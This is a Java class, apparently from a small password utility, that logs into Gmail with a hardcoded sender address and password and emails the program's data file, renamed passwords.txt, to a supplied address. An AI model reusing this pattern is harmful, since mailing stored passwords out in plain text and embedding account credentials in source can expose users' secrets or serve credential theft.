
package ua.com.vlkvsky;

import java.awt.Component;
import java.io.File;
import java.util.Properties;
import javax.activation.DataHandler;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.MessagingException;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.Message.RecipientType;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;
import ua.com.vlkvsky.Data;

public class Mail {
    private String to;

    public Mail(String sendTo) {
        this.to = sendTo;
        this.send(this.to);
    }

    private void send(String to) {
        String from = "get.pass.sender.email@gmail.com";
        String username = "get.pass.sender.email@gmail.com";
        String password = "r3VY1cvq";
        Properties props = new Properties();
        props.put("mail.smtp.auth", "true");
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.host", "smtp.gmail.com");
        props.put("mail.smtp.port", "587");
        Session session = Session.getInstance(props, new Authenticator() {
            protected PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication("get.pass.sender.email@gmail.com", "r3VY1cvq");
            }
        });

        try {
            MimeMessage e = new MimeMessage(session);
            e.setFrom(new InternetAddress(from));
            e.setRecipients(RecipientType.TO, InternetAddress.parse(to));
            e.setSubject("Hello," + System.getProperty("user.name"));
            MimeBodyPart messageBodyPart = new MimeBodyPart();
            messageBodyPart.setText("This is your password file.");
            MimeMultipart multipart = new MimeMultipart();
            multipart.addBodyPart(messageBodyPart);
            messageBodyPart = new MimeBodyPart();
            String newFileName = "passwords.txt";
            File file = new File(Data.getDataFile());
            File fileDest = new File(newFileName);
            file.renameTo(fileDest);
            FileDataSource source = new FileDataSource(newFileName);
            messageBodyPart.setDataHandler(new DataHandler(source));
            messageBodyPart.setFileName(newFileName);
            multipart.addBodyPart(messageBodyPart);
            e.setContent(multipart);
            Transport.send(e);
            fileDest.renameTo(file);
            JOptionPane.showMessageDialog((Component)null, "Sent message successfully....");
        } catch (MessagingException var14) {
            JOptionPane.showMessageDialog((Component)null, "Error sending to email.", "Error", 0);
        }

    }
}
